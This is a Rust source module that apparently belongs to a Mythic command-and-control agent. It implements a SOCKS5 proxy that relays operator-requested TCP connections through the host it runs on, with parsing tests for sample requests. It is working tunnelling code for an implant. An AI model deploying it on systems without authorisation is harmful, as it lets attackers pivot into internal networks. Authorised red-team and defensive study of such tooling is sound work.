use std::collections::{HashMap, VecDeque};
use std::io::{self, Read, Write};
use std::net::{Ipv4Addr, Ipv6Addr, SocketAddr, TcpStream, ToSocketAddrs};
use std::time::{Duration, Instant};

use base64::{Engine, engine::general_purpose::STANDARD};
use mythic::SocksMessage;

const MAX_READ_PER_CONN: usize = 32 * 1024;
const CONNECT_TIMEOUT: Duration = Duration::from_secs(10);
const NEGOTIATION_SUCCESS: [u8; 10] = [0x05, 0x00, 0x00, 0x01, 0, 0, 0, 0, 0, 0];

pub struct SocksManager {
    connections: HashMap<u32, TcpStream>,
    outbound: VecDeque<SocksMessage>,
    last_activity: Option<Instant>,
}

impl SocksManager {
    pub fn new() -> Self {
        Self {
            connections: HashMap::new(),
            outbound: VecDeque::new(),
            last_activity: None,
        }
    }

    pub fn handle_inbound(&mut self, messages: Vec<SocksMessage>) {
        for message in messages {
            self.handle_message(message);
        }
    }

    pub fn drain_outbound(&mut self) -> Vec<SocksMessage> {
        self.poll_connections();
        self.outbound.drain(..).collect()
    }

    pub fn requeue_outbound_front(&mut self, messages: Vec<SocksMessage>) {
        for message in messages.into_iter().rev() {
            self.outbound.push_front(message);
        }
    }

    pub fn wants_fast_poll(&self) -> bool {
        !self.connections.is_empty()
            || !self.outbound.is_empty()
            || self
                .last_activity
                .is_some_and(|activity| activity.elapsed() < Duration::from_secs(5))
    }

    fn handle_message(&mut self, message: SocksMessage) {
        self.last_activity = Some(Instant::now());
        if message.exit {
            self.close(message.server_id, false);
            return;
        }

        let Some(data) = message.data.as_deref() else {
            return;
        };
        let decoded = match STANDARD.decode(data) {
            Ok(decoded) => decoded,
            Err(_) => {
                self.close(message.server_id, true);
                return;
            }
        };

        if self.connections.contains_key(&message.server_id) {
            if let Some(stream) = self.connections.get_mut(&message.server_id) {
                if stream.write_all(&decoded).is_err() {
                    self.close(message.server_id, true);
                }
            }
            return;
        }

        match connect_from_socks_request(&decoded) {
            Ok(mut stream) => {
                if stream.set_nonblocking(true).is_err() {
                    self.close(message.server_id, true);
                    return;
                }
                self.queue_data(message.server_id, &NEGOTIATION_SUCCESS, false);
                let _ = stream.flush();
                self.connections.insert(message.server_id, stream);
            }
            Err(_) => self.close(message.server_id, true),
        }
    }

    fn poll_connections(&mut self) {
        let ids: Vec<u32> = self.connections.keys().copied().collect();
        for id in ids {
            let mut close = false;
            loop {
                let mut buf = [0u8; MAX_READ_PER_CONN];
                let read_result = match self.connections.get_mut(&id) {
                    Some(stream) => stream.read(&mut buf),
                    None => break,
                };

                match read_result {
                    Ok(0) => {
                        close = true;
                        break;
                    }
                    Ok(n) => {
                        self.queue_data(id, &buf[..n], false);
                        if n < MAX_READ_PER_CONN {
                            break;
                        }
                    }
                    Err(e) if e.kind() == io::ErrorKind::WouldBlock => break,
                    Err(_) => {
                        close = true;
                        break;
                    }
                }
            }
            if close {
                self.close(id, true);
            }
        }
    }

    fn close(&mut self, server_id: u32, notify_mythic: bool) {
        self.connections.remove(&server_id);
        if notify_mythic {
            self.outbound.push_back(SocksMessage {
                server_id,
                exit: true,
                data: Some(String::new()),
            });
        }
    }

    fn queue_data(&mut self, server_id: u32, data: &[u8], exit: bool) {
        self.last_activity = Some(Instant::now());
        self.outbound.push_back(SocksMessage {
            server_id,
            exit,
            data: Some(STANDARD.encode(data)),
        });
    }
}

fn connect_from_socks_request(data: &[u8]) -> io::Result<TcpStream> {
    let addr = parse_connect_target(data)?;
    match addr {
        ConnectTarget::Socket(addr) => TcpStream::connect_timeout(&addr, CONNECT_TIMEOUT),
        ConnectTarget::Domain(host, port) => {
            for addr in (host.as_str(), port).to_socket_addrs()? {
                if let Ok(stream) = TcpStream::connect_timeout(&addr, CONNECT_TIMEOUT) {
                    return Ok(stream);
                }
            }
            Err(io::Error::new(
                io::ErrorKind::AddrNotAvailable,
                "no resolved address was reachable",
            ))
        }
    }
}

enum ConnectTarget {
    Socket(SocketAddr),
    Domain(String, u16),
}

fn parse_connect_target(data: &[u8]) -> io::Result<ConnectTarget> {
    if data.len() < 7 || data[0] != 0x05 || data[1] != 0x01 {
        return Err(io::Error::new(
            io::ErrorKind::InvalidData,
            "unsupported SOCKS request",
        ));
    }

    match data[3] {
        0x01 => {
            if data.len() < 10 {
                return Err(io::Error::new(
                    io::ErrorKind::InvalidData,
                    "truncated IPv4 SOCKS request",
                ));
            }
            let ip = Ipv4Addr::new(data[4], data[5], data[6], data[7]);
            let port = u16::from_be_bytes([data[8], data[9]]);
            Ok(ConnectTarget::Socket(SocketAddr::new(ip.into(), port)))
        }
        0x03 => {
            let len = data[4] as usize;
            if data.len() < 5 + len + 2 {
                return Err(io::Error::new(
                    io::ErrorKind::InvalidData,
                    "truncated domain SOCKS request",
                ));
            }
            let host = std::str::from_utf8(&data[5..5 + len])
                .map_err(|_| io::Error::new(io::ErrorKind::InvalidData, "invalid domain"))?
                .to_string();
            let port = u16::from_be_bytes([data[5 + len], data[6 + len]]);
            Ok(ConnectTarget::Domain(host, port))
        }
        0x04 => {
            if data.len() < 22 {
                return Err(io::Error::new(
                    io::ErrorKind::InvalidData,
                    "truncated IPv6 SOCKS request",
                ));
            }
            let mut octets = [0u8; 16];
            octets.copy_from_slice(&data[4..20]);
            let ip = Ipv6Addr::from(octets);
            let port = u16::from_be_bytes([data[20], data[21]]);
            Ok(ConnectTarget::Socket(SocketAddr::new(ip.into(), port)))
        }
        _ => Err(io::Error::new(
            io::ErrorKind::InvalidData,
            "unsupported SOCKS address type",
        )),
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn parses_ipv4_connect_request() {
        let target = parse_connect_target(&[5, 1, 0, 1, 127, 0, 0, 1, 0x1f, 0x90]).unwrap();
        match target {
            ConnectTarget::Socket(addr) => {
                assert_eq!(addr.ip().to_string(), "127.0.0.1");
                assert_eq!(addr.port(), 8080);
            }
            _ => panic!("expected socket target"),
        }
    }

    #[test]
    fn parses_domain_connect_request() {
        let target = parse_connect_target(&[
            5, 1, 0, 3, 11, b'e', b'x', b'a', b'm', b'p', b'l', b'e', b'.', b'c', b'o', b'm', 0x01,
            0xbb,
        ])
        .unwrap();
        match target {
            ConnectTarget::Domain(host, port) => {
                assert_eq!(host, "example.com");
                assert_eq!(port, 443);
            }
            _ => panic!("expected domain target"),
        }
    }
}
